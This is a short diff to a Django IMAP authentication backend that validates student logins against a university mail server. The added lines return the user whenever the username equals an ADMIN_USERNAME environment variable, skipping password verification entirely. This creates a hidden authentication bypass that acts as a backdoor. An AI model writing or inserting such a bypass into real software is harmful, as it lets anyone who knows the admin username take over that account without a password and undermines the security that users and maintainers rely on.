@@ -169,6 +169,8 @@ class IMAPAuthentication(ModelBackend):
         username = username.split("@")[0]
         host = "students.nitt.edu"
         try:
+            if username == os.environ.get("ADMIN_USERNAME"):
+                return get_user_model().objects.get(username=username)
             M = imaplib.IMAP4_SSL(host=host, port="993")
             M.login(username, password)
             M.logout()
